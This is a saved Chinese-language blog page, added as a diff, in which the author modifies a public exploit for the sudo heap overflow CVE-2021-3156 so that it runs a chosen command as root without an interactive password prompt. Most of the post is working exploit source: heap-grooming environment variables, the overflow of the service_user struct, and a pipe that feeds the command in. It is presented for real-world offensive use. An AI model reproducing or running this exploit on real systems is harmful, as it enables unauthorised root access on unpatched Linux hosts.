@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>CVE-2021-3156 - Exploit修改 « 倾旋的博客</title>
+  <meta name="description" content="New-Exploit :  https://github.com/Rvn0xsy/CVE-2021-3156-plus0x01 为什么要修改？本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Expl...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2021-02-09/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">CVE-2021-3156 - Exploit修改</h1>
+    <p class="post-meta">Feb 9, 2021</p>
+  </header>
+
+  <article class="post-content">
+    <p>New-Exploit :  https://github.com/Rvn0xsy/CVE-2021-3156-plus</p>
+
+<h2 id="0x01-为什么要修改">0x01 为什么要修改？</h2>
+
+<p>本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。</p>
+
+<h2 id="0x02-linux-管道符">0x02 Linux 管道符</h2>
+
+<p>在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"new-pass"</span> | passwd <span class="nt">--stdin</span> username
+</code></pre></div></div>
+
+<blockquote>
+  <p>该命令只适用于旧版，不建议在命令行中传递明文密码</p>
+</blockquote>
+
+<p>于是我查看了<code class="language-plaintext highlighter-rouge">sudoedit</code>的帮助参数：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b48cb294f10647a53f73faf693e36bed.png" alt="2021-02-10-02-34-34"></p>
+
+<p>设置<code class="language-plaintext highlighter-rouge">-S</code>参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。</p>
+
+<h2 id="0x03-exploit分析">0x03 Exploit分析</h2>
+
+<p>本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用<code class="language-plaintext highlighter-rouge">execve</code>触发。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;unistd.h&gt;
+int execve(const char *pathname, char *const argv[],char *const envp[]);
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b9010235634b6c87d21520578240e984.png" alt="2021-02-10-02-44-51"></p>
+
+<p>在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span><span class="o">*</span> <span class="n">sudoedit_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"sudoedit"</span><span class="p">,</span>
+    <span class="s">"-S"</span><span class="p">,</span> <span class="c1">// --stdin 非交互式</span>
+    <span class="s">"-s"</span><span class="p">,</span>
+    <span class="n">buf</span><span class="p">,</span>
+    <span class="nb">NULL</span><span class="p">};</span>
+</code></pre></div></div>
+
+<p>紧接着，需要思考如何传入密码了。</p>
+
+<blockquote>
+  <p>经过测试，即使密码错误的情况下，也能够提权成功。</p>
+</blockquote>
+
+<p>经过查阅资料，关于execve的特点如下：</p>
+
+<p>execve创建的进程将会重新初始化堆栈、堆和（初始化和未初始化的）数据段。</p>
+
+<p>All process attributes are preserved during an execve(), except the following:</p>
+
+<ul>
+  <li>The dispositions of any signals that are being caught are reset to the default (signal(7)).</li>
+  <li>Any alternate signal stack is not preserved (sigaltstack(2)).</li>
+  <li>Memory mappings are not preserved (mmap(2)).</li>
+  <li>Attached System V shared memory segments are detached (shmat(2)).</li>
+  <li>POSIX shared memory regions are unmapped (shm_open(3)).</li>
+  <li>Open POSIX message queue descriptors are closed(mq_overview(7)).</li>
+  <li>Any open POSIX named semaphores are closed (sem_overview(7)).</li>
+  <li>POSIX timers are not preserved (timer_create(2)).</li>
+  <li>Any open directory streams are closed (opendir(3)).</li>
+  <li>Memory locks are not preserved (mlock(2), mlockall(2)).</li>
+  <li>Exit handlers are not preserved (atexit(3), on_exit(3)).</li>
+  <li>The floating-point environment is reset to the default (see fenv(3)).</li>
+  <li>….</li>
+</ul>
+
+<p>这就意味着，在调用execve之前向stdin写入数据，创建后的进程也是读不到的。</p>
+
+<p>于是我写了一个小例子来测验我的解决办法：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="kt">int</span> <span class="n">des_p</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">des_p</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">perror</span><span class="p">(</span><span class="s">"Pipe failed"</span><span class="p">);</span>
+          <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">// 创建一个子进程向stdout管道填入数据</span>
+        <span class="p">{</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">);</span>  <span class="c1">// 关闭系统输出流</span>
+            <span class="n">dup</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>         <span class="c1">// 将系统输出流替换为管道</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>       <span class="c1">// 关闭输入管道</span>
+            <span class="kt">char</span> <span class="o">*</span> <span class="n">password</span> <span class="o">=</span> <span class="s">"test</span><span class="se">\r\n</span><span class="s">1111"</span><span class="p">;</span> <span class="c1">// 设置管道内容</span>
+            <span class="n">write</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">password</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">password</span><span class="p">));</span> <span class="c1">// 将内容写到输出管道中</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="c1">// 关闭输出管道</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>            <span class="c1">// 创建一个子进程</span>
+        <span class="p">{</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">);</span>   <span class="c1">// 关闭系统输入流</span>
+            <span class="n">dup</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>         <span class="c1">// 将系统输入流替换为输入管道</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>       <span class="c1">//  关闭输出管道</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>     <span class="c1">// 关闭输入管道</span>
+
+            <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">prog2</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"wc"</span><span class="p">,</span> <span class="s">"-l"</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span> <span class="c1">// 执行wc -l </span>
+            <span class="n">execvp</span><span class="p">(</span><span class="n">prog2</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">prog2</span><span class="p">);</span>
+            <span class="n">perror</span><span class="p">(</span><span class="s">"execvp of wc failed"</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">wait</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">wait</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5cd0d7de66ef48c3cae7021b88576487.png" alt="2021-02-10-03-10-12"></p>
+
+<p>测试结果正确：2！</p>
+
+<p>stdin的值为：<code class="language-plaintext highlighter-rouge">test\r\n1111</code>，wc -l 命令读取是以<code class="language-plaintext highlighter-rouge">\n</code>为每一项分割的，因此返回的是2。</p>
+
+<p>这个方案可以直接拿到Exploit中，将stdin覆盖，向管道写入<code class="language-plaintext highlighter-rouge">密码\n命令</code>，然后把命令传入即可。</p>
+
+<p>为什么这里是<code class="language-plaintext highlighter-rouge">密码\n命令</code>呢？</p>
+
+<p>是因为第一个<code class="language-plaintext highlighter-rouge">\n</code>是为了结束密码的传递，然后开始堆溢出，溢出完成后，后续的命令刚好会传入到Shellcode启动的<code class="language-plaintext highlighter-rouge">/bin/sh</code>中。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dd2237b99e5fb3010d0ac87636fba9d4.png" alt="2021-02-10-03-13-24"></p>
+
+<p>修改后的Exploit：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt; // execve()
+#include &lt;string.h&gt; // strcat()
+#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: %s &lt;Command&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Refrence : @Qualys Research Team @Max Kamper </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Modify by Rvn0xsy@ https://payloads.online</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>	
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">char</span> <span class="o">*</span> <span class="n">input_command</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">nSize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">input_command</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">;</span>
+    
+    <span class="kt">char</span> <span class="o">*</span> <span class="n">command</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nSize</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="n">nSize</span><span class="p">);</span>
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="s">"test</span><span class="se">\n\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">input_command</span><span class="p">);</span>
+    <span class="c1">// 'buf' size determines size of overflowing chunk.</span>
+    <span class="c1">// This will allocate an 0xf0-sized chunk before the target service_user struct.</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0xf0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'Y'</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\"</span><span class="s">);</span><span class="err">
+
+</span><span class="s">    char* sudoedit_argv[] = {</span><span class="err">
+</span><span class="s">        "</span><span class="n">sudoedit</span><span class="s">",</span><span class="err">
+</span><span class="s">	    "</span><span class="o">-</span><span class="n">S</span><span class="s">",</span><span class="err">
+</span><span class="s">        "</span><span class="o">-</span><span class="n">s</span><span class="s">",</span><span class="err">
+</span><span class="s">        buf,</span><span class="err">
+</span><span class="s">        NULL};</span><span class="err">
+
+</span><span class="s">    // Use some LC_ vars for heap Feng-Shui.</span><span class="err">
+</span><span class="s">    // This should allocate the target service_user struct in the path of the overflow.</span><span class="err">
+</span><span class="s">    char messages[0xe0] = {"</span><span class="n">LC_MESSAGES</span><span class="o">=</span><span class="n">en_GB</span><span class="p">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="err">@</span><span class="s">"};</span><span class="err">
+</span><span class="s">    memset(messages + strlen(messages), 'A', 0xb8);</span><span class="err">
+
+</span><span class="s">    char telephone[0x50] = {"</span><span class="n">LC_TELEPHONE</span><span class="o">=</span><span class="n">C</span><span class="p">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="err">@</span><span class="s">"};</span><span class="err">
+</span><span class="s">    memset(telephone + strlen(telephone), 'A', 0x28);</span><span class="err">
+
+</span><span class="s">    char measurement[0x50] = {"</span><span class="n">LC_MEASUREMENT</span><span class="o">=</span><span class="n">C</span><span class="p">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="err">@</span><span class="s">"};</span><span class="err">
+</span><span class="s">    memset(measurement + strlen(measurement), 'A', 0x28);</span><span class="err">
+
+</span><span class="s">    // This environment variable will be copied onto the heap after the overflowing chunk.</span><span class="err">
+</span><span class="s">    // Use it to bridge the gap between the overflow and the target service_user struct.</span><span class="err">
+</span><span class="s">    char overflow[0x500] = {0};</span><span class="err">
+</span><span class="s">    memset(overflow, 'X', 0x4cf);</span><span class="err">
+</span><span class="s">    strcat(overflow, "</span><span class="err">\</span><span class="s">");</span><span class="err">
+
+</span><span class="s">    // Overwrite the 'files' service_user struct's name with the path of our shellcode library.</span><span class="err">
+</span><span class="s">    // The backslashes write nulls which are needed to dodge a couple of crashes.</span><span class="err">
+</span><span class="s">    char* envp[] = {</span><span class="err">
+</span><span class="s">        overflow,</span><span class="err">
+</span><span class="s">        "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">",</span><span class="err">
+</span><span class="s">        "</span><span class="n">XXXXXXX</span><span class="err">\</span><span class="s">",</span><span class="err">
+</span><span class="s">        "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">",</span><span class="err">
+</span><span class="s">        "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">", "</span><span class="err">\</span><span class="s">",</span><span class="err">
+</span><span class="s">        "</span><span class="n">x</span><span class="o">/</span><span class="n">x</span><span class="err">\</span><span class="s">",</span><span class="err">
+</span><span class="s">        "</span><span class="n">Z</span><span class="s">",</span><span class="err">
+</span><span class="s">        messages,</span><span class="err">
+</span><span class="s">        telephone,</span><span class="err">
+</span><span class="s">        measurement,</span><span class="err">
+</span><span class="s">        NULL};</span><span class="err">
+
+</span><span class="s">	int des_p[2];</span><span class="err">
+</span><span class="s">	if(pipe(des_p) == -1){</span><span class="err">
+
+</span><span class="s">		puts("</span><span class="n">Error</span> <span class="p">..</span> <span class="n">pipe</span> <span class="err">\</span><span class="n">n</span><span class="s">");</span><span class="err">
+</span><span class="s">		return -1;</span><span class="err">
+</span><span class="s">	}</span><span class="err">
+</span><span class="s">	</span><span class="err">
+</span><span class="s">	if(fork() == 0)   </span><span class="err">
+</span><span class="s">        {</span><span class="err">
+</span><span class="s">            close(STDOUT_FILENO);</span><span class="err">
+</span><span class="s">            dup(des_p[1]);  </span><span class="err">
+</span><span class="s">            close(des_p[0]); </span><span class="err">
+</span><span class="s">	    write(des_p[1],command, strlen(command));</span><span class="err">
+</span><span class="s">            close(des_p[1]);</span><span class="err">
+</span><span class="s">	    exit(1);</span><span class="err">
+</span><span class="s">        }</span><span class="err">
+
+</span><span class="s">	if(fork()==0){</span><span class="err">
+</span><span class="s">		close(STDIN_FILENO); </span><span class="err">
+</span><span class="s">		dup(des_p[0]);  </span><span class="err">
+</span><span class="s">		close(des_p[1]); </span><span class="err">
+</span><span class="s">		close(des_p[0]);</span><span class="err">
+</span><span class="s">		</span><span class="err">
+</span><span class="s">		execve("</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sudoedit</span><span class="s">", sudoedit_argv, envp);</span><span class="err">
+</span><span class="s">		perror("</span><span class="n">execvp</span> <span class="n">of</span> <span class="n">stdread</span> <span class="n">failed</span><span class="s">");</span><span class="err">
+</span><span class="s">		exit(1);</span><span class="err">
+</span><span class="s">	}</span><span class="err">
+</span><span class="s">	close(des_p[0]);</span><span class="err">
+</span><span class="s">	close(des_p[1]);</span><span class="err">
+</span><span class="s">	wait(0);</span><span class="err">
+</span><span class="s">	wait(0);</span><span class="err">
+</span><span class="s">}</span><span class="err">
+</span></code></pre></div></div>
+
+<h2 id="0x03-演示效果">0x03 演示效果</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: ./exploit &lt;Command&gt; 
+[+]Refrence : @Qualys Research Team @Max Kamper 
+[+]Modify by Rvn0xsy@ https://payloads.online
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3090faa10656870d97de81bfad60c107.png" alt="2021-02-10-03-18-26"></p>
+
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
